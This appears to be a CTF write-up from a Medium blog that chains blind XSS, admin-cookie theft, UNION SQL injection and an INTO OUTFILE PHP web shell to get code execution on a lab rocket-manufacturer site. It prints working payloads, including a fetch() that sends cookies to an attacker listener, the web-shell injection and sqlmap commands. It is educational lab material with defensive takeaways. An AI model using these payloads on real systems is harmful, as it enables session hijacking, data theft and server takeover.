# Apsis CTF Writeup: Chaining Blind XSS, Session Hijacking & SQL Injection to RCE

> **Author**: Razzle Mouse 🐭
> **Published**: Jun 1, 2026

---

![Razzle Mouse 🐭](https://miro.medium.com/v2/resize:fill:32:32/1*hePsP1GSR2Oin3UpbpZwkw.jpeg)

2

1

1

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*GwoQ5jiTTbo5K5PrP7aAoA.png)

Platform: Webverse CTF
Difficulty: Medium
Category: Web / AppSec
Flag: WEBVERSE{ap0g33_xxxxxxxxxxxxxxxxxxxxxxxxxxx}
Target: http://apsis.local

## Introduction

Apsis is a multi-service lab simulating a commercial rocket manufacturing platform. A competitor publicly referenced internal quote details — the scenario: find out how they got in.

The lab runs six containers behind an nginx gateway:

- A public marketing site (PHP/Apache)
- An admin triage panel (PHP/Apache)
- A FastAPI rocket-specs service
- A Puppeteer-driven headless Chrome admin bot
- A MySQL backend hardened with secure_file_priv
- An nginx reverse proxy fronting everything

The full attack chain:

- Identify a blind XSS opportunity in the contact form — payloads are never reflected back to the attacker, only rendered by the admin bot
- Craft a cookie exfiltration payload and inject it across multiple form fields
- Reuse the captured admin session cookie to access the admin panel
- Exploit a UNION-based SQL injection in the order search
- Leak @@secure_file_priv, pivot to INTO OUTFILE to drop a PHP web shell
- Execute commands and read the flag

## Reconnaissance

The public site at It http://apsis.local/ is a marketing page for a rocket manufacturer. It includes a contact/quote request form with fields for company name, contact name, email, and a company URL.

The admin panel lives at http://admin.apsis.local/ and prompts for credentials we don't have — yet.

A key clue from the lab description: an admin bot periodically reviews incoming contact submissions. Wherever a browser renders user input, that’s worth probing.

## Step 1 — Identifying the Blind XSS Opportunity

This is blind XSS — not a reflected or self-observable stored XSS. You never see your own payload execute. The form at http://apsis.local/contact.php accepts a submission, an admin bot reviews it server-side, and the only way to know if your script ran is if you receive an out-of-band callback.

The form has four fields: Your name, Email, Subject, Company URL (optional), and Mission details. Since there’s no way to see how each field renders in the admin view without already having access, the approach was to spray the exfiltration payload across every field simultaneously:

![image](https://miro.medium.com/v2/resize:fit:700/1*bemkmfC79zwMHuI4VZqpjg.png)

```
Your name:       razzle@mouse.com
Email:           razzle@mouse.com
Subject:         "><script>fetch('http://10.8.0.127:9090/c?x='+document.cookie)</script>
Company URL:     "><script>fetch('http://10.8.0.127:9090/c?x='+document.cookie)</script>
Mission details: "><script>fetch('http://10.8.0.127:9090/c?x='+document.cookie)</script>
```

If any field renders unsanitised in the admin view, one of the payloads fires. You don’t need to guess which one — the callback tells you it worked, and the admin session cookie is the prize. The "> prefix breaks out of any surrounding HTML attribute context before the <script> tag.

## Step 2 — Cookie Exfiltration via the Admin Bot

Set up a netcat listener on the attacker VPN machine before submitting:

![image](https://miro.medium.com/v2/resize:fit:667/1*iguHPK1t98Dqpd2JvnCsWg.png)

```
nc -lvnp 9090
```

Submitted the contact form with the payload in all injectable fields (as above). The admin bot’s headless Chrome processed the submission and one of the fields rendered raw — the script fired. The listener caught the callback:

```
connect to [10.8.0.127] from (UNKNOWN) [10.8.0.1] 35614
GET /c?x=OPALSESS=nAYIYwdfxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1
Host: 10.8.0.127:9090
User-Agent: Mozilla/5.0 ... HeadlessChrome/147.0.0.0 ...
Origin: http://admin.apsis.local
```

The User-Agent confirms it was HeadlessChrome. The cookie OPALSESS is the admin's live session token.

## Step 3 — Session Hijacking → Admin Panel Access

With the captured cookie, accessing the admin panel is trivial. Set the cookie in the browser or use curl:

```
curl -b "OPALSESS=nAYIYwdfxxxxxxxxxxxxxxxxxxxxxxxxx" \
  http://admin.apsis.local/dashboard.php
```

![image](https://miro.medium.com/v2/resize:fit:700/1*9h7OfC2539-GGUEHSbDMhg.png)

Full access granted. The panel shows an Order Book and Quote Desk — internal rocket charter data. The logged-in identity: Marin Ops Triage, Mission Operations.

## Step 4 — UNION-Based SQL Injection in Order Search

The Order Book at /orders.php?search= filters by customer name. Throwing a single quote at it:

```
curl -b "OPALSESS=nAYIYwdxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \                                                                       
  "http://admin.apsis.local/orders.php?search='"
```

![image](https://miro.medium.com/v2/resize:fit:700/1*0OdNL7apMz2I8Nd-aLA8Lw.png)

Produces a MySQL error — classic unparameterised query. Running sqlmap to confirm and enumerate:

```
sqlmap -u "http://admin.apsis.local/orders.php?search=test" \
  --cookie="OPALSESS=nAYIYwdxxxxxxxxxxxxxxxxxxxxxxxxxx" \
  --dbms=mysql \
  --batch \
  --level=3 \
  --risk=2 \
  --dump
```

![image](https://miro.medium.com/v2/resize:fit:700/1*m2YMh2U-aiGhpmj368MdmQ.png)

sqlmap identifies a UNION query injection — 4 columns, with the injectable payload landing in column 3:

```
search=test' UNION ALL SELECT NULL,NULL,CONCAT(...),NULL-- -
```

The full database dumps:

Table: products — 5 rocket SKUs (APX-100 through APX-MTO), prices from $875K to $14.5M

## Get Razzle Mouse 🐭’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Table: customers — 5 organisations including Phenom Defense Inc. (ITAR-flagged), Lacuna Imaging, Helio Microsystems

Table: orders — 9 active charters; manifested, paid, and pending status

This confirms the competitor data leak: quote details were fully exposed via the injection.

## Step 5 — Leaking secure_file_priv and Dropping a Web Shell

The challenge description notes that LOAD_FILE() is blocked — secure_file_priv restricts it. But INTO OUTFILE writes to that same path, which is the pivot.

First, leak the configured path:

```
curl -s "http://admin.apsis.local/orders.php?search=test%27%20UNION%20ALL%20SELECT%20NULL%2C%40%40secure_file_priv%2CNULL%2CNULL--+-" \
--cookie "OPALSESS=nAYIYwdfs8GiUdwLpmPnCMS5b3WVqigqk9XJaCCk_Q4"
```

The response renders the value in the Customer column:

![image](https://miro.medium.com/v2/resize:fit:700/1*CPtzIcdKMuenZg_ifnLdPQ.png)

secure_file_priv = /var/www/html/ — exactly where Apache serves the public site. INTO OUTFILE to that path will drop a file that's directly accessible via HTTP.

Note: sqlmap cannot execute INTO OUTFILE through its --sql-query flag because it treats it as a SELECT returning data. The write must be done via raw curl.

Writing the web shell directly:

```
curl -v "http://admin.apsis.local/orders.php" \
  --cookie "OPALSESS=nAYIYwdfs8GiUdwLpmPnCMS5b3WVqigqk9XJaCCk_Q4" \
  --get \
  --data-urlencode "search=test' UNION ALL SELECT NULL,NULL,'<?php system(\$_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -"
```

The response returned a PHP fatal error:

![image](https://miro.medium.com/v2/resize:fit:700/1*2AbT2SgKcqJz83dlyQUT-A.png)

```
Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool
in /var/www/html/orders.php on line 75
```

This is expected — INTO OUTFILE produces no result set, so fetch_assoc() fails on a boolean false. The write itself succeeded before PHP tried to fetch rows. The shell is on disk.

## Step 6 — RCE and Flag Retrieval

Verifying shell execution:

```
curl "http://apsis.local/shell.php?cmd=id"
```

![image](https://miro.medium.com/v2/resize:fit:650/1*WQchPaN3nFfrwS_PcgBTdA.png)

```
\N      \N      uid=1001(apollo) gid=1001(apollo) groups=1001(apollo)      \N
```

The \N values are MySQL NULL placeholders from the other UNION columns — the middle value is the real command output. Shell is live as user apollo.

Finding the flag:

```
curl "http://apsis.local/shell.php?cmd=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
```

![image](https://miro.medium.com/v2/resize:fit:700/1*gixw8YvCJ5tI3avfvKC55g.png)

```
\N      \N      /home/apollo/flag.txt      \N
```

Reading it:

```
curl "http://apsis.local/shell.php?cmd=cat+/home/apollo/flag.txt"
```

![image](https://miro.medium.com/v2/resize:fit:700/1*T3GJvShwABdCvxAE4wd9oA.png)

Flag captured:

```
WEBVERSE{ap0g33_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

## 😬 The Embarrassing Miss

The blind XSS fired on the very first submit. Cookie arrived clean. Session hijack worked perfectly.

Then I spent 40 minutes trying to use SQLmap’s --sql-query to write the shell:

```
sqlmap --sql-query="SELECT '<?php system... ?>' INTO OUTFILE '/var/www/html/shell.php'"
```

sqlmap kept returning:

```
WARNING: execution of non-query SQL statements is only available when stacked queries are supported
```

I tried --technique=S, --prefix, --suffix, re-running with --flush-session. Went down a rabbit hole, wondering if the MySQL user lacked FILE privilege. Checkeduser(), checkedgrants, ran @@global.secure_file_priv three times as if the answer would change.

The fix was one curl command. A direct GET request with the payload URL-encoded. sqlmap was never going to run INTO OUTFILE through a UNION injection because it doesn't produce rows to fetch — that's not a sqlmap limitation, it's just how MySQL works. A raw HTTP request bypasses sqlmap entirely and lets the query execute without caring about the result set.

The PHP fatal error on line 75 was the success signal. The moment I saw fetch_assoc() on bool, the file was already written. I nearly tried a different path because the 200 response "looked wrong."

The rule: INTO OUTFILE via UNION injection → raw curl, not sqlmap. The error response is the confirmation.

## Key Takeaways

Why is blind XSS underestimated? Regular reflected XSS requires the attacker to trigger the payload themselves. Blind XSS is different — the payload executes in someone else’s browser, at an unknown time, in a context you can’t see. The standard test of “does alert(1) pop?” doesn’t work here because you never see the page. The only valid test is an out-of-band callback: fetch() to a listener, a DNS ping, or a service like XSS Hunter. If you're not exfiltrating something over the network, you'll never know it fired. The contact form was the entry point, but the real vulnerability was that the admin review panel rendered user-submitted content as raw HTML without output encoding.

Why headless bots make XSS critical: In many apps, stored XSS is rated medium severity because real admins rarely click every submission. A Puppeteer/Chrome bot that programmatically visits every form submission eliminates that assumption entirely. The bot is reliable and fast — better than a human victim.

Why secure_file_priv doesn't prevent shell writes: The MySQL hardening blocked LOAD_FILE() — reading arbitrary files from the OS. It secure_file_priv also designates the allowed write path. Setting it to /var/www/html/ was meant to restrict writes to a "safe" directory, but that directory is directly served by Apache. Writing a PHP file makes it immediately executable. A path that's both writable by MySQL and served by a PHP-capable web server eliminates the protection entirely.

Why PHP fatal errors aren’t always a failure: INTO OUTFILE writes before the PHP application tries to process the result. A PHP crash after the query runs doesn't undo the file write. Always check whether the file exists before concluding that the write failed.

## Wrap-Up

Apsis is a great example of how a few common security mistakes can be chained together into a complete compromise. The attack began with a Blind XSS vulnerability in a contact form, allowing attacker-controlled JavaScript to execute when an administrator reviewed submissions. This provided an initial foothold and access to privileged functionality.

Further investigation revealed a SQL injection vulnerability in the order search feature. By exploiting the injectable query, it was possible to interact directly with the database. While MySQL’s secure_file_priv Setting restricted file operations, it was configured to point at the web root, unintentionally enabling a PHP file to be written through INTO OUTFILE.

One interesting aspect of the exploitation was that the application displayed a PHP error after the payload was executed. Although it appeared to indicate failure, the file write had already succeeded. The error was simply the result of the application attempting to process a query that no longer returned a normal result set.

Overall, the compromise was not caused by a single critical flaw but by multiple trust assumptions throughout the application. User input was not properly validated, stored content was rendered without adequate sanitization, database queries were constructed insecurely, and a security control was configured in a way that ultimately assisted the attacker. Together, these issues demonstrate how seemingly minor weaknesses can combine into a serious security risk.

### #CyberSecurity #WebSecurity #PenetrationTesting #BlindXSS #SessionHijacking #SQLInjection #RCE #EthicalHacking #AppSec #OWASP #BugBounty #RedTeam #CTFWriteup #PHP #MySQL #OffensiveSecurity #SecurityResearch



---
*Original URL: [https://medium.com/@razzlemouse/apsis-ctf-writeup-chaining-blind-xss-session-hijacking-sql-injection-to-rce-9fe2934a1987?source=search_post---------0-----------------------------------](https://medium.com/@razzlemouse/apsis-ctf-writeup-chaining-blind-xss-session-hijacking-sql-injection-to-rce-9fe2934a1987?source=search_post---------0-----------------------------------)*
